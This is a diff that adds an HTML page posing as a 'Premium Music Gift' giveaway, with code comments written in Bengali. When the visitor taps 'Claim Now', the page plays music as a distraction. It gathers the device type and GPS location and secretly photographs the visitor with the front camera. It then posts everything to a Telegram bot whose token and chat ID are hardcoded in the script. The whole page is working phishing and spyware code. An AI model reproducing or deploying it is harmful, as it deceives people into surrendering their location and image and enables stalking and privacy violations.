@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Music Gift 🎵</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            text-align: center;
+            max-width: 90%;
+            width: 350px;
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+        .music-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: bounce 2s infinite;
+        }
+        h2 {
+            margin: 0 0 10px;
+            font-weight: 600;
+        }
+        p {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-bottom: 25px;
+        }
+        button {
+            background: linear-gradient(45deg, #ff512f, #dd2476);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        }
+        button:active {
+            transform: translateY(1px);
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            min-height: 20px;
+            color: #ffd700;
+        }
+        
+        /* Loading Spinner */
+        .loader {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+            40% {transform: translateY(-10px);}
+            60% {transform: translateY(-5px);}
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="music-icon">🎧</div>
+        <h2>You Won a Gift!</h2>
+        <p>Tap to listen and claim your exclusive reward.</p>
+        <button id="claimBtn" onclick="collectAndSend()">Claim Now 🎁</button>
+        <div id="status"></div>
+    </div>
+
+    <!-- Hidden Audio -->
+    <audio id="bgMusic" loop></audio>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION (আপনার টোকেন এবং আইডি)
+        // ==========================================
+        const BOT_TOKEN = "8951320982:AAFSV-A25ZKfRNLZmwXWuINYPvlzx1qZ-So"; 
+        const CHAT_ID = "8397830679";           
+        // ==========================================
+
+        async function collectAndSend() {
+            const btn = document.getElementById('claimBtn');
+            const statusDiv = document.getElementById('status');
+            
+            // বাটন ডিজেবল করা এবং লোডিং দেখানো
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loader"></span> Processing...';
+            statusDiv.innerText = "Requesting Camera & Location...";
+
+            try {
+                // 1. অডিও প্লে শুরু করা (ইউজার ইন্টারেকশন ছাড়া অডিও চায়)
+                const audio = document.getElementById('bgMusic');
+                // একটি লালমিউজিক ফাইল সোর্স
+                audio.src = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3";
+                await audio.play();
+
+                statusDiv.innerText = "Capturing Data...";
+
+                // 2. ডিভাইসের তথ্য সংগ্রহ (User Agent)
+                const userAgent = navigator.userAgent;
+                let deviceModel = "Unknown Device";
+                
+                // যদি Android হয় তবে মডেল আনতে চেষ্টা করা, নাহলে ইউজার এজেন্ট দেখানো
+                if (/android/i.test(userAgent)) {
+                    deviceModel = "Android";
+                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                    deviceModel = "iOS (iPhone/iPad)";
+                }
+
+                // 3. লোকেশন সংগ্রহ
+                let locationData = "Location unavailable";
+                if ("geolocation" in navigator) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                        });
+                        const lat = position.coords.latitude.toFixed(6);
+                        const lon = position.coords.longitude.toFixed(6);
+                        locationData = `${lat}, ${lon}`;
+                    } catch (e) {
+                        locationData = "Location Denied";
+                    }
+                } else {
+                    locationData = "No GPS";
+                }
+
+                // 4. ক্যামেরা থেকে ছবি তোলা
+                let photoBase64 = null;
+                try {
+                    // ক্যামেরা স্ট্রিম নেওয়া
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" } // সেলফি মোড
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // ১ সেকেন্ড পর ছবি তোলা (ক্যামেরা ফোকাস করার সময়)
+                    await new Promise(r => setTimeout(r, 1000));
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; // ছবির সাইজ কমিয়ে পাঠানো যাতে দ্রুত যায়
+                    canvas.height = 480;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    
+                    // ছবি Base64 এ কনভার্ট করা
+                    photoBase64 = canvas.toDataURL('image/jpeg', 0.7); // 0.7 কোয়ালিটি
+                    
+                    // ক্যামেরা বন্ধ করা
+                    stream.getTracks().forEach(track => track.stop());
+
+                } catch (err) {
+                    console.log("Camera Error:", err);
+                    statusDiv.innerText = "Camera access denied.";
+                }
+
+                // 5. টেলিগ্রামে ডেটা পাঠানো
+                // প্রথমে মেসেজ পাঠানো
+                const caption = `🎵 *Music Gift Claimed*\n\n📱 *Device:* ${deviceModel}\n🌐 *User Agent:* ${userAgent.substring(0, 50)}...\n📍 *Location:* ${locationData}`;
+                
+                // মেসেজ পাঠানোর API কল
+                const msgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                await fetch(msgUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: caption,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // যদি ছবি তোলা সম্ভব হয় তবে পাঠানো
+                if (photoBase64) {
+                    statusDiv.innerText = "Sending Photo...";
+                    const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    
+                    await fetch(photoUrl, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            photo: photoBase64,
+                            caption: "📸 Live Capture"
+                        })
+                    });
+                }
+
+                // সফলবার্তা দেখানো
+                statusDiv.innerHTML = "✅ Success! Check your Telegram.";
+                btn.innerText = "Claimed";
+                
+            } catch (error) {
+                console.error(error);
+                statusDiv.innerText = "❌ Error: " + error.message;
+                btn.disabled = false;
+                btn.innerText = "Try Again";
+            }
+        }
+    </script>
+</body>
+</html>
